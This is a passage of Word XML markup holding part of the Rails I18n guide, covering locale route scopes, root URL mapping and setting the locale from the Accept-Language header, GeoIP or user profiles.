        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>books_url</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, etc.) will now </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>automatically include the locale in the query string</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, like this: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://localhost:3001/?locale=ja</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D4C321" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You may be satisfied with this. It does impact the readability of URLs, though, when the locale “hangs” at the end of every </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in your application. Moreover, from the architectural standpoint, locale is usually hierarchically above the other parts of the application domain: and URLs should reflect this.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314E9A49" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You probably want URLs to look like this: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>www.example.com/en/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (which loads the English locale) and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>www.example.com/nl/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (which loads the Netherlands locale). This is achievable with the “over-riding </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>default_url_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">” strategy from above: you just have to set up your routes with </w:t>
      </w:r>
      <w:hyperlink r:id="rId541" w:anchor="M000354" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>path_prefix</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> option in this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="054A97F1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F81BF6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/routes.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F99C1CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>scope "/:locale"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68AC52A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  resources :books</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35EAA1B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="19B39D58" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now, when you call the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>books_path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method you should get </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>"/en/books"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (for the default locale). An </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://localhost:3001/nl/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> should load the Netherlands locale, then, and following calls to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>books_path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> should return </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>"/nl/books"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (because the locale changed).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA7F391" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you don’t want to force the use of a locale in your routes you can use an optional path scope (denoted by the parentheses) like so:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4728"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="61E466CE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3837B6CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/routes.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C6CA7FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>scope "(:locale)", :locale</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; /en|nl/ do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F75AD16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  resources :books</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="607E21D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1248CDCC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this approach you will not get a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Routing Error</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when accessing your resources such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://localhost:3001/books</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> without a locale. This is useful for when you want to use the default locale when one is not specified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0BC03D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Of course, you need to take special care of the root </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (usually “homepage” or “dashboard”) of your application. An </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://localhost:3001/nl</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will not work automatically, because the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>root :to =&gt; "books#index"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>routes.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> doesn’t take locale into account. (And rightly so: there’s only one “root” </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DA8F51" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You would probably need to map URLs like these:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4368"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="112EA327" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22B9083E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/routes.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F7E0911" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>match '/:locale'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'dashboard#index'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4535B7B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Do take special care about the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>order of your routes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, so this route declaration does not “eat” other ones. (You may want to add it directly before the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>root :to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D5587F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Have a look at two plugins which simplify work with routes in this way: Sven Fuchs’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId542" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>routing_filter</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and Raul Murciano’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId543" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>translate_routes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB0CD63" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.6 Setting the Locale from the Client Supplied Information</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C43337" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In specific cases, it would make sense to set the locale from client-supplied information, i.e. not from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This information may come for example from the users’ preferred language (set in their browser), can be based on the users’ geographical location inferred from their IP, or users can provide it simply by choosing the locale in your application interface and saving it to their profile. This approach is more suitable for web-based applications or services, not for websites — see the box about </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>sessions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and RESTful architecture above.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EDC6AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.6.1 Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Accept-Language</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EBEB3C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">One source of client supplied information would be an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Accept-Language</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header. People may </w:t>
      </w:r>
      <w:hyperlink r:id="rId544" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>set this in their browser</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> or other clients (such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AC3775" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A trivial implementation of using an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Accept-Language</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header would be: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21F3FC2" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03D87B78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set_locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="230556A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  logger.debug "* Accept-Language: #{request.env['HTTP_ACCEPT_LANGUAGE']}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EDA1704" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  I18n.locale = extract_locale_from_accept_language_header</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FB1BFD5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  logger.debug "* Locale set to '#{I18n.locale}'"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51191DE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B9C0FDD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>private</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D1963EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>extract_locale_from_accept_language_header</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="121B88B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  request.env['HTTP_ACCEPT_LANGUAGE'].scan(/^[a-z]{2}/).first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4558937F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33DDE066" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Of course, in a production environment you would need much more robust code, and could use a plugin such as Iain Hecker’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId545" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>http_accept_language</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> or even Rack middleware such as Ryan Tomayko’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId546" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>locale</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F68AAF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.6.2 Using GeoIP (or Similar) Database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A334F6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another way of choosing the locale from client information would be to use a database for mapping the client IP to the region, such as </w:t>
      </w:r>
      <w:hyperlink r:id="rId547" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>GeoIP Lite Country</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. The mechanics of the code would be very similar to the code above — you would need to query the database for the user’s IP, and look up your preferred locale for the country/region/city returned.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7A684E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.6.3 User Profile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C004729" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also provide users of your application with means to set (and possibly over-ride) the locale in your application interface, as well. Again, mechanics for this approach would be very similar to the code above — you’d probably let users choose a locale from a dropdown list and save it to their profile in the database. Then you’d set the locale to this value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B6CD08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Internationalizing your Application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE47D48" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>OK! Now you’ve initialized I18n support for your Ruby on Rails application and told it which locale to use and how to preserve it between requests. With that in place, you’re now ready for the really interesting stuff.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A6F0AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Let’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>internationalize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> our application, i.e. abstract every locale-specific parts, and then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>localize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it, i.e. provide necessary translations for these abstracts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136BD532" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You most probably have something like this in one of your applications:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2FA04E24" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2ADEA96B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config/routes.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B1647EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Yourapp::Application.routes.draw do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60D28266" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
